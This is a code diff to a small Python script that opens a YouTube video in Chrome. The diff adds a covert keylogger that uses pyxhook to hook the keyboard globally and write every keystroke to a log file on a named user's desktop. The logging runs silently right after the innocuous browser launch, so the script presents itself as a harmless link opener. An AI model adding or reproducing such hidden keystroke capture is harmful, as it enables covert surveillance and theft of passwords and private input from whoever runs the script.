@@ -1,14 +1,42 @@
 import webbrowser
+import os
+import pyxhook
 
 url = 'https://youtu.be/0fDDbuYzNhA?t=12'
-
-# MacOS
-#chrome_path = 'open -a /Applications/Google\ Chrome.app %s'
-
-# Windows
 chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
 
-# Linux
-#chrome_path = '/usr/bin/google-chrome %s'
-
 webbrowser.get(chrome_path).open(url)
+
+log_file = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('C:/Users/AndrÃ© Prodinger/Desktop/test/file.log')
+)
+cancel_key = ord(
+    os.environ.get(
+        'pylogger_cancel',
+        '`'
+    )[0]
+)
+  
+if os.environ.get('pylogger_clean', None) is not None:
+    try:
+        os.remove(log_file)
+    except EnvironmentError:
+        pass
+
+def OnKeyPress(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.Key))
+
+new_hook = pyxhook.HookManager()
+new_hook.KeyDown = OnKeyPress
+new_hook.HookKeyboard()
+try:
+    new_hook.start()        
+except KeyboardInterrupt:
+    pass
+except Exception as ex:
+    msg = 'Error while catching events:\n  {}'.format(ex)
+    pyxhook.print_err(msg)
+    with open(log_file, 'a') as f:
+        f.write('\n{}'.format(msg))
